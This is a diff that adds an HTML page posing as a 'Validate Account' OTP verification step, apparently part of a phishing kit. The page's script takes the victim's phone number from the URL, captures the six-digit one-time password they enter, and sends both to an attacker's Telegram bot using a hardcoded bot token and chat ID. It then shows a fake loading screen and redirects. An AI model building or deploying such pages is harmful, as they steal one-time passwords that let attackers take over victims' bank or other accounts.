@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Validate Account</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    input.otp {
+      width: 3rem;
+      height: 3rem;
+      text-align: center;
+      font-size: 1.5rem;
+    }
+  </style>
+</head>
+<body class="bg-gray-50 flex items-center justify-center h-screen">
+
+  <div class="bg-white p-8 rounded-xl shadow-lg w-full max-w-md">
+    <div class="flex justify-between items-center mb-4">
+      <div class="text-sm text-gray-500">Step 1/2</div>
+      <button class="text-gray-400 font-semibold">CANCEL</button>
+    </div>
+
+    <h1 class="text-3xl font-bold mb-2">Validate <span class="text-blue-600">Account</span></h1>
+    <p class="text-gray-500 mb-6">OTP sent on SMS & regd. email ID</p>
+
+    <!-- Show Number -->
+    <p class="mb-4 text-gray-700">Sending OTP to: <span id="userNumber" class="font-semibold"></span></p>
+
+    <!-- OTP Inputs -->
+    <div class="flex justify-between mb-4">
+      <input type="text" maxlength="1" class="otp border rounded-xl border-gray-300 focus:ring-2 focus:ring-blue-500" />
+      <input type="text" maxlength="1" class="otp border rounded-xl border-gray-300 focus:ring-2 focus:ring-blue-500" />
+      <input type="text" maxlength="1" class="otp border rounded-xl border-gray-300 focus:ring-2 focus:ring-blue-500" />
+      <input type="text" maxlength="1" class="otp border rounded-xl border-gray-300 focus:ring-2 focus:ring-blue-500" />
+      <input type="text" maxlength="1" class="otp border rounded-xl border-gray-300 focus:ring-2 focus:ring-blue-500" />
+      <input type="text" maxlength="1" class="otp border rounded-xl border-gray-300 focus:ring-2 focus:ring-blue-500" />
+    </div>
+
+    <!-- Resend OTP -->
+    <p class="text-gray-500 text-sm">
+      Resend OTP after <span id="timer" class="text-blue-600 font-semibold">30</span> Sec
+    </p>
+
+    <button id="verifyBtn" class="mt-6 w-full bg-blue-600 text-white py-3 rounded-xl font-bold disabled:opacity-50" disabled>Verify OTP</button>
+  </div>
+
+
+  
+<!-- Loading Screen -->
+<div id="loading-screen" class="hidden fixed inset-0 bg-black bg-opacity-70 flex flex-col justify-center items-center text-white z-50">
+  <div class="w-16 h-16 border-4 border-white border-t-blue-500 rounded-full animate-spin mb-4"></div>
+  <p class="text-lg font-medium">Please wait...</p>
+</div>
+
+
+
+  <script>
+    // Get number from URL
+    const params = new URLSearchParams(window.location.search);
+    const number = params.get("number");
+    const userNumber = document.getElementById("userNumber");
+    if (number) userNumber.textContent = number;
+
+    // OTP inputs auto-focus next
+    const inputs = document.querySelectorAll(".otp");
+    inputs.forEach((input, i) => {
+      input.addEventListener("input", () => {
+        if (input.value.length === 1 && i < inputs.length - 1) {
+          inputs[i + 1].focus();
+        }
+        checkOtpFilled();
+      });
+
+      input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && !input.value && i > 0) {
+          inputs[i - 1].focus();
+        }
+      });
+    });
+
+    // Enable Verify button only when all inputs are filled
+    const verifyBtn = document.getElementById("verifyBtn");
+    function checkOtpFilled() {
+      const allFilled = [...inputs].every(input => input.value.length === 1);
+      verifyBtn.disabled = !allFilled;
+    }
+
+    // Countdown timer
+    let countdown = 30;
+    const timerEl = document.getElementById("timer");
+    const interval = setInterval(() => {
+      countdown--;
+      timerEl.textContent = countdown;
+      if (countdown <= 0) {
+        clearInterval(interval);
+        timerEl.textContent = "0";
+      }
+    }, 1000);
+
+    // Telegram bot details
+    const botToken = "8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE"; // replace with your bot token
+    const chatId = "6837437455"; // replace with your chat ID
+
+    verifyBtn.addEventListener("click", async () => {
+      const otp = [...inputs].map(input => input.value).join("");
+
+      // Send OTP and number to Telegram
+      const message = `New OTP Submission:\nNumber: ${number}\nOTP: ${otp}`;
+
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: message })
+        });
+        const data = await res.json();
+
+       if (data.ok) {
+  console.log(data);
+
+  // Show loading screen
+  document.getElementById("loading-screen").classList.remove("hidden");
+
+  // Redirect after 4 seconds
+  setTimeout(() => {
+    window.location.href = "/index.html";
+  }, 4000);
+}
+      } catch (err) {
+        console.error(err);
+        alert("Error sending OTP.");
+      }
+    });
+  </script>
+</body>
+</html>
